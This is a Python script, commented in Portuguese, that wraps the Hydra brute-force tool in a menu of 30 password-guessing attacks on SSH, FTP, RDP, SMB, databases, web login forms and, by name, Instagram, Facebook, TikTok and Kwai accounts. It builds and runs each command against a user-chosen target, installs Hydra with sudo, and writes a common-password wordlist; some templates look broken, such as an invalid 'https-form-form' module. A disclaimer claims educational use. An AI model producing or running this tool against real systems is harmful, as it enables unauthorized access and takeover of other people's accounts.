#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import subprocess
import time
from colorama import Fore, Style, init

init(autoreset=True)

# ======= Banner =======
def banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(Fore.RED + Style.BRIGHT + r"""
    ██╗  ██╗██╗   ██╗██████╗ ██████╗  █████╗ 
    ██║  ██║╚██╗ ██╔╝██╔══██╗██╔══██╗██╔══██╗
    ███████║ ╚████╔╝ ██║  ██║██████╔╝███████║
    ██╔══██║  ╚██╔╝  ██║  ██║██╔══██╗██╔══██║
    ██║  ██║   ██║   ██████╔╝██║  ██║██║  ██║
    ╚═╝  ╚═╝   ╚═╝   ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
        [ HYDRA ATTACK MENU - 30 TECHNIQUES ]
    """ + Style.RESET_ALL)

# ======= Técnicas de Ataque Hydra =======
tecnicas = {
    1: ("FTP Attack", "hydra -L USER_FILE -P PASS_FILE ftp://TARGET"),
    2: ("SSH Attack", "hydra -L USER_FILE -P PASS_FILE ssh://TARGET"),
    3: ("Telnet Attack", "hydra -L USER_FILE -P PASS_FILE telnet://TARGET"),
    4: ("HTTP GET Form", "hydra -L USER_FILE -P PASS_FILE TARGET http-get-form:/PATH:LOGIN_PARAM=^USER^&PASS_PARAM=^PASS^:FAIL_MESSAGE"),
    5: ("HTTP POST Form", "hydra -l USER -P PASS_FILE TARGET http-post-form:/PATH:LOGIN_PARAM=^USER^&PASS_PARAM=^PASS^:FAIL_MESSAGE"),
    6: ("HTTPS Form", "hydra -L USER_FILE -P PASS_FILE TARGET https-form-form:/PATH:LOGIN_PARAM=^USER^&PASS_PARAM=^PASS^:FAIL_MESSAGE"),
    7: ("MySQL Attack", "hydra -L USER_FILE -P PASS_FILE TARGET mysql"),
    8: ("MSSQL Attack", "hydra -L USER_FILE -P PASS_FILE TARGET mssql"),
    9: ("PostgreSQL Attack", "hydra -L USER_FILE -P PASS_FILE TARGET postgres"),
    10: ("RDP Attack", "hydra -L USER_FILE -P PASS_FILE rdp://TARGET"),
    11: ("SMB Attack", "hydra -L USER_FILE -P PASS_FILE smb://TARGET"),
    12: ("VNC Attack", "hydra -P PASS_FILE TARGET vnc"),
    13: ("SNMP Attack", "hydra -P PASS_FILE TARGET snmp"),
    14: ("POP3 Attack", "hydra -L USER_FILE -P PASS_FILE pop3://TARGET"),
    15: ("IMAP Attack", "hydra -L USER_FILE -P PASS_FILE imap://TARGET"),
    16: ("SMTP Attack", "hydra -L USER_FILE -P PASS_FILE smtp://TARGET"),
    17: ("LDAP Attack", "hydra -L USER_FILE -P PASS_FILE ldap://TARGET"),
    18: ("IRC Attack", "hydra -L USER_FILE -P PASS_FILE irc://TARGET"),
    19: ("XMPP Attack", "hydra -L USER_FILE -P PASS_FILE xmpp://TARGET"),
    20: ("Oracle Attack", "hydra -L USER_FILE -P PASS_FILE TARGET oracle"),
    21: ("Cisco Attack", "hydra -P PASS_FILE TARGET cisco"),
    22: ("Cisco Enable", "hydra -P PASS_FILE TARGET cisco-enable"),
    23: ("Teamspeak Attack", "hydra -P PASS_FILE TARGET teamspeak"),
    24: ("SIP Attack", "hydra -L USER_FILE -P PASS_FILE sip://TARGET"),
    25: ("Redis Attack", "hydra -P PASS_FILE TARGET redis"),
    26: ("MongoDB Attack", "hydra -L USER_FILE -P PASS_FILE TARGET mongodb"),
    27: ("Instagram Attack", "hydra -l USERNAME -P PASS_FILE TARGET http-post-form:/login:username=^USER^&password=^PASS^:Incorrect"),
    28: ("Facebook Attack", "hydra -l EMAIL -P PASS_FILE TARGET http-post-form:/login:email=^USER^&pass=^PASS^:incorrect"),
    29: ("TikTok Attack", "hydra -l USERNAME -P PASS_FILE TARGET http-post-form:/login:username=^USER^&password=^PASS^:error"),
    30: ("Kwai Attack", "hydra -l USERNAME -P PASS_FILE TARGET http-post-form:/auth/login:username=^USER^&password=^PASS^:error"),
}

# ======= Verificar se o Hydra está instalado =======
def verificar_hydra():
    try:
        result = subprocess.run(["hydra", "-h"], capture_output=True, text=True, timeout=10)
        if "Hydra" in result.stdout or "Hydra" in result.stderr:
            print(Fore.GREEN + "[+] Hydra encontrado!")
            return True
    except (subprocess.CalledProcessError, FileNotFoundError):
        print(Fore.RED + "[X] Hydra não encontrado.")
        
        # Tentar instalar automaticamente
        print(Fore.YELLOW + "[~] Tentando instalar o Hydra...")
        try:
            if os.name == 'posix':  # Linux/Unix
                subprocess.run(["sudo", "apt", "install", "hydra", "-y"], 
                             capture_output=True, timeout=120)
                print(Fore.GREEN + "[+] Hydra instalado com sucesso!")
                return True
            else:  # Windows
                print(Fore.RED + "[X] Instalação automática não suportada no Windows.")
                print(Fore.YELLOW + "[!] Instale manualmente o Hydra")
                return False
        except:
            print(Fore.RED + "[X] Falha ao instalar Hydra automaticamente.")
            print(Fore.YELLOW + "[!] Instale manualmente: sudo apt install hydra")
            return False

# ======= Obter entrada do usuário =======
def obter_entrada(prompt, default=""):
    if default:
        entrada = input(Fore.YELLOW + f"{prompt} [{default}]: ").strip()
        return entrada if entrada else default
    else:
        return input(Fore.YELLOW + f"{prompt}: ").strip()

# ======= Construir comando Hydra =======
def construir_comando(base_cmd):
    comando = base_cmd
    
    # Substituir TARGET
    if "TARGET" in comando:
        target = obter_entrada("Digite o alvo (IP/URL)", "192.168.1.1")
        comando = comando.replace("TARGET", target)
    
    # Substituir USER_FILE
    if "USER_FILE" in comando:
        user_file = obter_entrada("Digite o caminho do arquivo de usuários", "users.txt")
        comando = comando.replace("USER_FILE", user_file)
    
    # Substituir PASS_FILE
    if "PASS_FILE" in comando:
        pass_file = obter_entrada("Digite o caminho do arquivo de senhas", "passwords.txt")
        comando = comando.replace("PASS_FILE", pass_file)
    
    # Substituir USER
    if "-l USER" in comando:
        user = obter_entrada("Digite o nome de usuário", "admin")
        comando = comando.replace("-l USER", f"-l {user}")
    
    # Substituir USERNAME
    if "USERNAME" in comando and "-l" not in comando:
        username = obter_entrada("Digite o nome de usuário", "admin")
        comando = comando.replace("USERNAME", username)
    
    # Substituir EMAIL
    if "EMAIL" in comando:
        email = obter_entrada("Digite o email", "admin@example.com")
        comando = comando.replace("EMAIL", email)
    
    # Substituir PATH em formulários web
    if "/PATH:" in comando:
        path = obter_entrada("Digite o caminho do formulário", "/login.php")
        comando = comando.replace("/PATH:", f"{path}:")
    
    # Personalizar ataques de redes sociais
    redes_sociais = ["Instagram", "Facebook", "TikTok", "Kwai"]
    for rede in redes_sociais:
        if rede in base_cmd:
            print(Fore.CYAN + f"\n[~] Configurando ataque para {rede}")
            if rede == "Instagram":
                usuario = obter_entrada("Nome de usuário", "seu_usuario")
                comando = comando.replace("USERNAME", usuario)
            elif rede == "Facebook":
                email = obter_entrada("Email", "seu_email@example.com")
                comando = comando.replace("EMAIL", email)
            else:
                usuario = obter_entrada("Nome de usuário", "seu_usuario")
                comando = comando.replace("USERNAME", usuario)
    
    return comando

# ======= Executar comando Hydra =======
def executar_comando(comando):
    print(Fore.CYAN + f"[>] Executando: {comando}")
    
    # Confirmar execução
    confirmar = input(Fore.YELLOW + "Deseja executar este comando? (S/N): ").strip().upper()
    if confirmar != 'S':
        print(Fore.YELLOW + "[!] Comando cancelado.")
        return
    
    try:
        # Executar o comando
        processo = subprocess.Popen(comando, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Mostrar saída em tempo real
        while True:
            output = processo.stdout.readline()
            if output == b'' and processo.poll() is not None:
                break
            if output:
                print(output.decode().strip())
        
        # Verificar se houve erro
        stderr = processo.stderr.read()
        if stderr:
            print(Fore.RED + f"Erro: {stderr.decode()}")
            
    except KeyboardInterrupt:
        print(Fore.RED + "\n[X] Comando interrompido pelo usuário.")
    except Exception as e:
        print(Fore.RED + f"[X] Erro ao executar comando: {e}")

# ======= Mostrar técnicas em 3 colunas =======
def mostrar_tecnicas():
    print(Fore.CYAN + "\n[~] Técnicas de Ataque Disponíveis:")
    print(Fore.CYAN + "-" * 90)
    
    # Organizar em 3 colunas
    items = list(tecnicas.items())
    for i in range(0, len(items), 3):
        linha = ""
        for j in range(3):
            if i + j < len(items):
                num, (nome, _) = items[i + j]
                linha += f"{Fore.YELLOW}[{num:02d}] {nome:<25}"
        print(linha)

# ======= Menu =======
def menu():
    while True:
        banner()
        mostrar_tecnicas()
        
        print(Fore.CYAN + "\n" + "="*90)
        print(Fore.MAGENTA + "OPÇÕES:")
        print(Fore.CYAN + "[01-30] Selecionar técnica de ataque")
        print(Fore.CYAN + "[C]     Comando personalizado do Hydra")
        print(Fore.CYAN + "[G]     Gerar arquivos de wordlist padrão")
        print(Fore.CYAN + "[0]     Sair")
        print(Fore.CYAN + "="*90)

        try:
            escolha = input(Fore.YELLOW + "\nEscolha uma opção: ").strip().upper()
            
            if escolha == '0':
                print(Fore.GREEN + "Saindo...")
                sys.exit()
            elif escolha == 'C':
                comando_personalizado = input(Fore.YELLOW + "Digite o comando Hydra personalizado: ").strip()
                executar_comando(comando_personalizado)
                input(Fore.GREEN + "\nPressione Enter para continuar...")
            elif escolha == 'G':
                gerar_wordlists()
            else:
                try:
                    escolha_num = int(escolha)
                    if escolha_num in tecnicas:
                        nome, comando_base = tecnicas[escolha_num]
                        comando_final = construir_comando(comando_base)
                        executar_comando(comando_final)
                        input(Fore.GREEN + "\nPressione Enter para continuar...")
                    else:
                        print(Fore.RED + "Opção inválida.")
                        time.sleep(1)
                except ValueError:
                    print(Fore.RED + "Opção inválida.")
                    time.sleep(1)
                    
        except KeyboardInterrupt:
            print(Fore.RED + "\n[X] Interrompido pelo usuário.")
            sys.exit()
        except Exception as e:
            print(Fore.RED + f"Erro: {e}")
            time.sleep(2)

# ======= Gerar wordlists padrão =======
def gerar_wordlists():
    print(Fore.CYAN + "\n[~] Gerando wordlists padrão...")
    
    # Wordlist de usuários comum
    usuarios_comuns = ["admin", "root", "user", "test", "administrator", "guest"]
    with open("users.txt", "w") as f:
        for usuario in usuarios_comuns:
            f.write(f"{usuario}\n")
    print(Fore.GREEN + "[+] Arquivo 'users.txt' criado com usuários comuns")
    
    # Wordlist de senhas comum
    senhas_comuns = ["123456", "password", "12345678", "qwerty", "123456789", "12345", 
                    "1234", "111111", "1234567", "dragon", "123123", "baseball", "abc123",
                    "football", "monkey", "letmein", "696969", "shadow", "master", "666666"]
    with open("passwords.txt", "w") as f:
        for senha in senhas_comuns:
            f.write(f"{senha}\n")
    print(Fore.GREEN + "[+] Arquivo 'passwords.txt' criado com senhas comuns")
    
    input(Fore.GREEN + "\nPressione Enter para continuar...")

# ======= Aviso Legal =======
def mostrar_aviso():
    print(Fore.RED + Style.BRIGHT + "\n" + "="*90)
    print("AVISO LEGAL:")
    print("Este software é apenas para fins educacionais e de teste de segurança.")
    print("Só utilize em sistemas que você possui permissão explícita para testar.")
    print("Ataques a redes sociais sem autorização são ILEGAIS.")
    print("O uso indevido desta ferramenta é de sua exclusiva responsabilidade.")
    print("Respeite as leis locais e não utilize para atividades ilegais.")
    print("="*90)
    
    resposta = input(Fore.YELLOW + "\nVocê concorda com os termos? (S/N): ").strip().upper()
    if resposta != 'S':
        print(Fore.RED + "Você precisa concordar com os termos para usar este software.")
        sys.exit(1)

# ======= MAIN =======
if __name__ == "__main__":
    mostrar_aviso()
    if verificar_hydra():
        menu()
    else:
        print(Fore.RED + "[X] Hydra não está instalado. Abortando.")
        sys.exit(1)
